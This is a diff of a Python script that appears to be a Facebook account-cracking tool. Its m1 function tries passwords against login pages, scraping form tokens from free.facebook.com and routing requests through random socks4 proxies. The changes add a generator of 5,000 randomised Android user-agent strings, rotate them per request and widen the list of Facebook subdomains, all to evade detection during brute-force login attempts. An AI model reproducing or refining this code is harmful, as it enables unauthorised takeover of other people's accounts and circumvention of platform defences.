@@ -320,22 +320,19 @@ except:
     print('No Internet Connection.....');exit()
 version = version.strip()
 #-------------------------[RANDOM]--------
-#-------------------------[METHOD 1 ]--------
-try:
-    DATAM1 = requests.get('https://raw.githubusercontent.com/Sumon8389/METHOD1/main/DATA.txt').text
-except:
-    print('No Internet Connection.....');exit()
-DATAM1 = DATAM1.strip()
-try:
-    HEADERSM1 = requests.get('https://raw.githubusercontent.com/Sumon8389/METHOD1/main/HEADERS.txt').text
-except:
-    print('No Internet Connection.....');exit()
-HEADERSM1 = HEADERSM1.strip()
-try:
-    URLM1 = requests.get('https://raw.githubusercontent.com/Sumon8389/METHOD1/main/URL.txt').text
-except:
-    print('No Internet Connection.....');exit()
-URLM1 = URLM1.strip()
+ugrn=[]
+for ua in range(5000):
+      a='Mozilla/5.0 (Linux; Android'
+      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
+      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
+      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+      d=random.randrange(40,115)
+      e='0'
+      f=random.randrange(3000,6000)
+      g=random.randrange(20,100)
+      h='Mobile Safari/537.36'
+      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
+      ugrn.append(ug)
 #----------------------------[USER/AGENT]--------------------------------------------------------------------------------------------------------------------------------#
 #----------------------------[USER/AGENT]--------------------------------------------------------------------------------------------------------------------------------#
 #----------------------------[USER/AGENT]--------------------------------------------------------------------------------------------------------------------------------#
@@ -703,12 +700,13 @@ def m1(ids,pwv):
     nip=random.choice(proxsi)
     proxs= {'http': 'socks4://'+nip}
     ua = ua_valid()
-    DOMAIN = ("m","business")
+    DOMAIN = ("m","business","mbasic","p","login")
     fb= random.choice(DOMAIN)
     warna = random.choice(my_color)
+    uger = random.choice(ugrn)
     try:
         for pas in pwv:
-            free_fb = session.get(f'https://{fb}.facebook.com').text
+            free_fb = session.get(f'https://free.facebook.com').text
             info={
             "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -726,7 +724,7 @@ def m1(ids,pwv):
             'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
             'sec-ch-ua-model': '"SM-G950FD"',
             'sec-ch-ua-mobile': '?1',
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
+            'User-Agent': uger,
             'viewport-width': '400',
             'Content-Type': 'application/x-www-form-urlencoded',
             'X-FB-LSD': 'AVr0Bh-X_bY',
